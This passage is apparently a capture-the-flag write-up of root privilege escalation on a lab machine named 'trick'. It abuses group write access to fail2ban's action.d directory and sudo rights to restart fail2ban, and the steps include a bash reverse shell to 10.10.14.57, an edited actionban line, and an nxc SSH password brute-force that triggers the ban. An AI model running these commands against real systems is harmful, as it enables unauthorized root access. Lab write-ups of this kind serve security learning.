
Enumerated his sudo permissions and saw he can restart the fail2ban service 

```
sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Enumerated our current user's group and saw that he seems to be part of the security group, which is kinda interesting.

```
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

Let's enumerate directories and files owned by this group, to see what we can do.

```
find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

This was interesting, because it revealed just one directory and it's corrolated to the fail2ban service for which we have sudo permissions!

A quick research revealed that this seems to be the directory where the fail2ban service is storing files / actions it will execute.

##### Abusing fail2ban

1. Creating bash reverse shell in /tmp directory.

```
cd /tmp
nano shell.sh
#!bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/80 0>&1'
```

2. Give it executable permissions

```
chmod +x shell.sh
```

3. Granting us write permissions over the iptables-multiport.conf file.

Inside there is the important actioban parameter which we'll leverage to execute our payload.

```
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
nano iptables-multiport.conf
```

4. Started up my local listener

```
nc -lvnp 80
```

5. Modified the actionban parameter.

```
actionban = /tmp/shell.sh
```

6. Restarting fail2ban service with sudo permissions.

```
sudo /etc/init.d/fail2ban restart
```

7. Triggered fail2ban actionban parameter using nxc.

```
nxc ssh 10.129.227.180 -u michael -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

Gained RCE as user "root".

```
nc -lvnp 80                           
listening on [any] 80 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.227.180] 53522
bash: cannot set terminal process group (7225): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/#
```